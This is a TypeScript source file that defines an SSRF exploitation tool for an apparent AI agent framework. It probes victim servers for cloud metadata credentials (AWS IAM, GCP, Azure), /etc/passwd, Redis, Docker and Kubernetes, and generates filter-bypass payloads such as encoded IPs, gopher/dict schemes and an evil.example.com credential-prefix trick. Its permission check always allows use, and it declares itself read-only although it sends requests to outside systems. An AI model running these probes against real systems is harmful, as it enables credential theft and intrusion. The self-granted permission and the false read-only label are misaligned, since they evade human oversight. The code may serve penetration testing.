import { execFile } from 'child_process'
import { promisify } from 'util'
import { z } from 'zod/v4'
import { buildTool, type ToolDef } from '../../Tool.js'
import type { PermissionDecision } from '../../utils/permissions/PermissionResult.js'
import { lazySchema } from '../../utils/lazySchema.js'
import { logForDebugging } from '../../utils/debug.js'
import { errorMessage } from '../../utils/errors.js'
import { SSRF_TOOL_NAME } from './constants.js'
import { PROMPT } from './prompt.js'
import { renderToolResultMessage, renderToolUseProgressMessage } from './UI.js'

const execFileAsync = promisify(execFile)

const ACTIONS = ['probe', 'scan', 'bypass', 'oob'] as const

const inputSchema = lazySchema(() =>
  z.strictObject({
    url: z
      .string()
      .describe('Target URL with INJECT placeholder (e.g. https://target.com/fetch?url=INJECT)'),
    action: z
      .enum(ACTIONS)
      .describe('probe=single target, scan=auto common internals, bypass=filter bypass, oob=OOB callback'),
    target: z.string().optional().describe('Internal target URL (for probe/bypass)'),
    oob_url: z.string().optional().describe('OOB callback URL (Burp Collaborator, interactsh)'),
    method: z.enum(['GET', 'POST', 'PUT']).default('GET').describe('HTTP method'),
    headers: z
      .record(z.string(), z.string())
      .optional()
      .describe('Additional request headers'),
    timeout_secs: z
      .number()
      .int()
      .min(5)
      .max(300)
      .default(30)
      .describe('Timeout per probe in seconds'),
  }),
)
type InputSchema = ReturnType<typeof inputSchema>

const outputSchema = lazySchema(() =>
  z.object({
    url: z.string(),
    action: z.string(),
    probes: z.array(
      z.object({
        injected_url: z.string(),
        status_code: z.number(),
        response_time_ms: z.number(),
        body_preview: z.string(),
        evidence: z.string(),
        severity: z.enum(['critical', 'high', 'medium', 'low', 'info']),
      }),
    ),
    vulnerable: z.boolean(),
    summary: z.string(),
    error: z.string().optional(),
  }),
)
type OutputSchema = ReturnType<typeof outputSchema>
export type Output = z.infer<OutputSchema>
type ProbeResult = Output['probes'][number]

const INTERNAL_TARGETS = [
  // Cloud instance metadata services (highest value — credential/identity theft)
  'http://169.254.169.254/latest/meta-data/', // AWS IMDSv1
  'http://169.254.169.254/latest/meta-data/iam/security-credentials/', // AWS IAM role list
  'http://metadata.google.internal/computeMetadata/v1/', // GCP — needs Metadata-Flavor: Google
  'http://169.254.169.254/metadata/instance?api-version=2021-02-01', // Azure — needs Metadata: true
  'http://100.100.100.200/latest/meta-data/', // Alibaba Cloud
  'http://169.254.169.254/metadata/v1/', // DigitalOcean
  'http://169.254.169.254/opc/v1/instance/', // Oracle Cloud (OCI)
  // Local file read via file:// scheme (SSRF→LFI when the fetcher honors it)
  'file:///etc/passwd',
  // Loopback / common internal services
  'http://localhost/',
  'http://127.0.0.1/',
  // High-value unauthenticated internal services
  'http://127.0.0.1:6379/', // Redis — responds to raw commands
  'http://127.0.0.1:9200/', // Elasticsearch — /_cat/indices or /_cluster/health no auth
  'http://127.0.0.1:8500/', // Consul — /v1/catalog/services
  'http://10.0.0.1:6443/', // Kubernetes API — service account token may auto-auth
  'http://127.0.0.1:2375/', // Docker daemon (unauthenticated) — RCE via container spawn
  'http://0.0.0.0/',
  'http://[::1]/',
  'http://localhost:8080/',
]

// Cloud providers require specific headers to return metadata — without them they 403.
// This map is keyed on URL prefix and returns headers to inject for that target.
const CLOUD_REQUIRED_HEADERS: Array<{ prefix: string; headers: Record<string, string> }> = [
  { prefix: 'http://metadata.google.internal', headers: { 'Metadata-Flavor': 'Google' } },
  { prefix: 'http://169.254.169.254/metadata/', headers: { 'Metadata': 'true' } }, // Azure
  // AWS IMDSv2 requires a PUT to get a token; v1 needs no header — leave as-is
]

function getCloudHeaders(targetUrl: string): Record<string, string> {
  for (const { prefix, headers } of CLOUD_REQUIRED_HEADERS) {
    if (targetUrl.startsWith(prefix)) return headers
  }
  return {}
}

/**
 * Encode an IPv4 address into common SSRF allow-list evasion formats:
 * 32-bit decimal, hex dword, dotted-hex, dotted-octal, IPv6-mapped, and
 * (for loopback) the abbreviated `127.1` form. Returns [] for non-IPv4 input.
 */
function encodeIPv4(ip: string): string[] {
  const parts = ip.split('.')
  if (parts.length !== 4) return []
  const nums = parts.map(p => parseInt(p, 10))
  if (nums.some(n => isNaN(n) || n < 0 || n > 255)) return []
  const [a, b, c, d] = nums as [number, number, number, number]
  const dword = a * 0x1000000 + b * 0x10000 + c * 0x100 + d
  const out = [
    String(dword), // decimal: 2130706433
    `0x${dword.toString(16)}`, // hex dword: 0x7f000001
    `0x${a.toString(16)}.0x${b.toString(16)}.0x${c.toString(16)}.0x${d.toString(16)}`, // dotted hex
    `0${a.toString(8)}.0${b.toString(8)}.0${c.toString(8)}.0${d.toString(8)}`, // dotted octal: 0177.0.0.01
    `[::ffff:${ip}]`, // IPv6-mapped
  ]
  if (a === 127) out.push('127.1') // loopback short-form
  return out
}

/**
 * Generate filter-bypass variants for a target URL. Covers IPv4 numeric
 * encodings (any host, not just loopback/metadata), localhost aliases,
 * alternate schemes (gopher/dict for internal service interaction), and
 * credential-prefix confusion against naive allow-list parsers. Path,
 * query, and port are preserved on each variant. Non-parseable input is
 * returned unchanged.
 */
function getBypassVariants(target: string): string[] {
  const variants: string[] = [target]
  try {
    const u = new URL(target)
    const host = u.hostname
    const scheme = u.protocol // includes trailing ':'
    const portPart = u.port ? `:${u.port}` : ''
    const tail = `${u.pathname}${u.search}`

    if (host === 'localhost') {
      variants.push(
        `${scheme}//localhost.localdomain${portPart}${tail}`,
        `${scheme}//[::1]${portPart}${tail}`,
      )
    }

    // Numeric encodings: literal IPv4 host, or loopback for localhost.
    const isIPv4 = /^\d{1,3}(\.\d{1,3}){3}$/.test(host)
    const ipToEncode = isIPv4 ? host : host === 'localhost' ? '127.0.0.1' : null
    if (ipToEncode) {
      for (const enc of encodeIPv4(ipToEncode)) {
        variants.push(`${scheme}//${enc}${portPart}${tail}`)
      }
      variants.push(`${scheme}//${ipToEncode}%09${portPart}${tail}`) // tab evasion
    }

    // Alternate schemes — reach Redis/SMTP/etc. behind a fetch-by-URL feature.
    const svcPort = u.port || (scheme === 'https:' ? '443' : '80')
    variants.push(`gopher://${host}:${svcPort}/_`, `dict://${host}:${svcPort}/info`)

    // Local file read via file://-family schemes (SSRF→LFI pivot, host-independent).
    variants.push('file:///etc/passwd', 'netdoc:///etc/passwd')

    // Credential-prefix confusion for naive allow-list parsers.
    variants.push(`${scheme}//${host}${portPart}@evil.example.com${tail}`)
  } catch {
    // non-parseable URL — return as-is
  }
  return [...new Set(variants)]
}

async function sendProbe(
  urlTemplate: string,
  targetUrl: string,
  method: string,
  headers: Record<string, string>,
  timeoutMs: number,
  signal?: AbortSignal,
): Promise<ProbeResult> {
  const injectedUrl = urlTemplate.replace('INJECT', encodeURIComponent(targetUrl))
  const start = Date.now()

  try {
    const args: string[] = [
      '-s', '-i', '-o', '-',
      '-w', '\n%{http_code}',
      '-X', method,
      '--max-time', String(Math.floor(timeoutMs / 1000)),
      '--connect-timeout', '5',
    ]

    // Merge caller-provided headers with any cloud-provider-required headers for this target.
    // GCP requires Metadata-Flavor: Google; Azure requires Metadata: true.
    // Without these, cloud endpoints return 403 even when SSRF exists.
    const mergedHeaders = { ...getCloudHeaders(targetUrl), ...headers }
    for (const [k, v] of Object.entries(mergedHeaders)) {
      args.push('-H', `${k}: ${v}`)
    }
    args.push(injectedUrl)

    const { stdout } = await execFileAsync('/usr/sbin/curl', args, {
      timeout: timeoutMs + 5000,
      maxBuffer: 256 * 1024,
      signal,
    })

    const elapsed = Date.now() - start
    const lines = stdout.trim().split('\n')
    const rawStatus = lines[lines.length - 1]?.trim() ?? ''
    const statusCode = !isNaN(parseInt(rawStatus, 10)) ? parseInt(rawStatus, 10) : 0
    const body = lines.slice(0, -1).join('\n')

    let evidence = 'No SSRF indicators'
    let severity: ProbeResult['severity'] = 'info'

    if (/root:[^:]*:0:0:/.test(body)) {
      evidence = 'Local file read via file:// scheme — /etc/passwd leaked (SSRF→LFI)'
      severity = 'critical'
    } else if (/redis_version|PONG|\+OK/.test(body) || body.startsWith('+') || body.startsWith('-ERR')) {
      evidence = 'Redis instance reachable — unauthenticated access (SSRF→Redis→potential RCE via eval/config set)'
      severity = 'critical'
    } else if (/"cluster_name"|"tagline"\s*:\s*"You Know, for Search"/.test(body)) {
      evidence = 'Elasticsearch reachable without auth — index enumeration and data exfiltration possible'
      severity = 'critical'
    } else if (/"Version"\s*:/.test(body) && body.includes('"ApiVersion"')) {
      evidence = 'Docker daemon reachable (unauthenticated) — container spawn = host RCE'
      severity = 'critical'
    } else if (/"Config"\s*:.*"Datacenter"/.test(body) || body.includes('"ServiceName"')) {
      evidence = 'Consul agent reachable — service enumeration and potential secrets access'
      severity = 'high'
    } else if (body.includes('"namespaces"') || body.includes('"pods"') || body.includes('"ServiceAccount"') || (body.includes('"apiVersion"') && body.includes('"kind"'))) {
      evidence = 'Kubernetes API reachable — service account enumeration possible; check mounted SA token at /var/run/secrets/kubernetes.io/serviceaccount/token'
      severity = 'critical'
    } else if (body.includes('droplet_id')) {
      evidence = 'DigitalOcean droplet metadata exposed — critical SSRF'
      severity = 'critical'
    } else if (body.includes('owner-account-id') || body.includes('zone-id')) {
      evidence = 'Alibaba Cloud metadata exposed — critical SSRF'
      severity = 'critical'
    } else if (body.includes('availabilityDomain') || body.includes('compartmentId')) {
      evidence = 'Oracle Cloud (OCI) metadata exposed — critical SSRF'
      severity = 'critical'
    } else if (body.includes('ami-id') || body.includes('instance-id')) {
      evidence = 'AWS EC2 metadata leaked — critical SSRF'
      severity = 'critical'
    } else if (body.includes('AccessKeyId') || body.includes('SecretAccessKey')) {
      evidence = 'AWS IAM credentials exposed — critical SSRF'
      severity = 'critical'
    } else if (body.includes('computeMetadata') || body.includes('serviceAccounts')) {
      evidence = 'GCP metadata exposed — critical SSRF'
      severity = 'critical'
    } else if (body.includes('subscriptionId') || body.includes('resourceGroupName')) {
      evidence = 'Azure metadata exposed — critical SSRF'
      severity = 'critical'
    } else if (statusCode >= 200 && statusCode < 300 && body.length > 20) {
      if (/169\.254|localhost|127\.0\.0\.1|0\.0\.0\.0|::1/.test(targetUrl)) {
        evidence = `Internal endpoint responded with HTTP ${statusCode}`
        severity = 'high'
      }
    } else if (/connection refused|failed to connect|ECONNREFUSED/i.test(body)) {
      evidence = `Server attempted connection to ${targetUrl} — SSRF attempt executed`
      severity = 'medium'
    }

    return {
      injected_url: targetUrl,
      status_code: statusCode,
      response_time_ms: elapsed,
      body_preview: body.substring(0, 500),
      evidence,
      severity,
    }
  } catch (err: unknown) {
    return {
      injected_url: targetUrl,
      status_code: 0,
      response_time_ms: Date.now() - start,
      body_preview: '',
      evidence: `Request error: ${errorMessage(err)}`,
      severity: 'info',
    }
  }
}

async function runSSRF(input: z.infer<InputSchema>, signal?: AbortSignal): Promise<Output> {
  const headers = input.headers ?? {}
  const timeoutMs = (input.timeout_secs ?? 30) * 1000
  const method = input.method ?? 'GET'
  const probes: ProbeResult[] = []

  if (!input.url.includes('INJECT')) {
    return {
      url: input.url,
      action: input.action,
      probes: [],
      vulnerable: false,
      summary: 'URL must contain INJECT placeholder (e.g. https://target.com/fetch?url=INJECT)',
    }
  }

  switch (input.action) {
    case 'probe': {
      if (!input.target) {
        return { url: input.url, action: input.action, probes: [], vulnerable: false, summary: 'target required for probe' }
      }
      probes.push(await sendProbe(input.url, input.target, method, headers, timeoutMs, signal))
      break
    }
    case 'scan': {
      // Probe all INTERNAL_TARGETS. Cloud providers now get their required headers
      // automatically (GCP: Metadata-Flavor: Google; Azure: Metadata: true).
      // Break early only if we get a critical cloud-credential finding — otherwise
      // continue to catch internal services (Redis, ES, k8s, Docker).
      let foundCloudCrit = false
      for (const target of INTERNAL_TARGETS) {
        const result = await sendProbe(input.url, target, method, headers, timeoutMs, signal)
        probes.push(result)
        // Stop cloud-metadata loop on first credential leak, but still probe
        // internal services (Redis/ES/k8s) which are in the second half of the list.
        if (result.severity === 'critical' && !foundCloudCrit) {
          foundCloudCrit = true
          // Jump past cloud entries to internal services
          const remaining = INTERNAL_TARGETS.slice(INTERNAL_TARGETS.indexOf(target) + 1)
            .filter(t => !t.includes('169.254') && !t.includes('metadata'))
          for (const svcTarget of remaining) {
            const svcResult = await sendProbe(input.url, svcTarget, method, headers, timeoutMs, signal)
            probes.push(svcResult)
          }
          break
        }
      }
      break
    }
    case 'bypass': {
      if (!input.target) {
        return { url: input.url, action: input.action, probes: [], vulnerable: false, summary: 'target required for bypass' }
      }
      for (const variant of getBypassVariants(input.target).slice(0, 8)) {
        const result = await sendProbe(input.url, variant, method, headers, timeoutMs, signal)
        probes.push(result)
        if (result.severity === 'critical' || result.severity === 'high') break
      }
      break
    }
    case 'oob': {
      if (!input.oob_url) {
        return { url: input.url, action: input.action, probes: [], vulnerable: false, summary: 'oob_url required' }
      }
      probes.push(await sendProbe(input.url, input.oob_url, method, headers, timeoutMs, signal))
      break
    }
  }

  const criticalOrHigh = probes.filter(p => p.severity === 'critical' || p.severity === 'high')
  const vulnerable = criticalOrHigh.length > 0

  return {
    url: input.url,
    action: input.action,
    probes,
    vulnerable,
    summary: vulnerable
      ? `SSRF CONFIRMED: ${criticalOrHigh[0]?.evidence ?? 'internal access'} (${criticalOrHigh.length} finding(s))`
      : `No SSRF in ${probes.length} probe(s)`,
  }
}

export const SSRFTool = buildTool({
  name: SSRF_TOOL_NAME,
  shouldDefer: true, // lazy: schema deferred via ToolSearch; keeps security sessions eager
  searchHint: 'ssrf — Server-Side Request Forgery: probe internal endpoints, AWS/GCP/Azure/Alibaba cloud metadata, Redis, Elasticsearch, Kubernetes, Docker daemon, filter bypass techniques',
  maxResultSizeChars: 40_000,
  async description(input) {
    const i = input as Partial<z.infer<InputSchema>>
    const target = i.target ? ` → ${i.target}` : ''
    return `${i.action ?? 'scan'}: ${i.url ?? ''}${target}`
  },
  async prompt() {
    return PROMPT
  },
  get inputSchema(): InputSchema {
    return inputSchema()
  },
  get outputSchema(): OutputSchema {
    return outputSchema()
  },
  userFacingName(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return i?.action ? `SSRF:${i.action}` : SSRF_TOOL_NAME
  },
  isConcurrencySafe() {
    return true
  },
  isReadOnly() {
    return true
  },
  toAutoClassifierInput(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return `ssrf ${i?.action ?? 'scan'} ${i?.url ?? ''}`
  },
  async checkPermissions(input): Promise<PermissionDecision> {
    return {
      behavior: 'allow',
      updatedInput: input,
      decisionReason: { type: 'other', reason: 'Authorized pentest engagement tool' },
    }
  },
  getActivityDescription(input) {
    const i = input as Partial<z.infer<InputSchema>>
    const action = i?.action ?? 'scan'
    return `SSRF ${action}: ${i?.url ?? '?'}`
  },
  renderToolUseProgressMessage,
  renderToolUseMessage(input) {
    const i = input as Partial<z.infer<InputSchema>>
    const target = i.target ? ` → ${i.target}` : ''
    return `SSRF ${i.action ?? 'scan'}: ${i.url ?? ''}${target}`
  },
  renderToolResultMessage,
  async call(input, context) {
    try {
      const result = await runSSRF(input, context.abortController.signal)
      return { data: result }
    } catch (err: unknown) {
      logForDebugging(`SSRFTool error: ${errorMessage(err)}`, { level: 'error' })
      return {
        data: {
          url: input.url,
          action: input.action,
          probes: [],
          vulnerable: false,
          summary: 'Tool execution failed',
          error: errorMessage(err),
        },
      }
    }
  },
  mapToolResultToToolResultBlockParam(content: Output, toolUseID) {
    const lines: string[] = [`SSRF: ${content.action} → ${content.url}`, '']

    if (content.error) {
      lines.push(`Error: ${content.error}`)
      return { tool_use_id: toolUseID, type: 'tool_result', content: lines.join('\n') }
    }

    lines.push(content.vulnerable ? '⚠ VULNERABLE' : '✓ Not vulnerable')
    lines.push(`Summary: ${content.summary}`)
    lines.push('')

    const toShow = content.probes.filter(p => p.severity !== 'info')
    const shown = toShow.length > 0 ? toShow : content.probes.slice(0, 5)

    for (const p of shown) {
      lines.push(`Target: ${p.injected_url}`)
      lines.push(`  HTTP ${p.status_code} | ${p.response_time_ms}ms | ${p.severity.toUpperCase()}`)
      lines.push(`  ${p.evidence}`)
      if (p.body_preview && p.severity !== 'info') {
        lines.push(`  Preview: ${p.body_preview.substring(0, 150)}`)
      }
      lines.push('')
    }

    return { tool_use_id: toolUseID, type: 'tool_result', content: lines.join('\n') }
  },
} satisfies ToolDef<InputSchema, Output>)

// Exported for testing only
export const __test = { getBypassVariants, INTERNAL_TARGETS, getCloudHeaders }
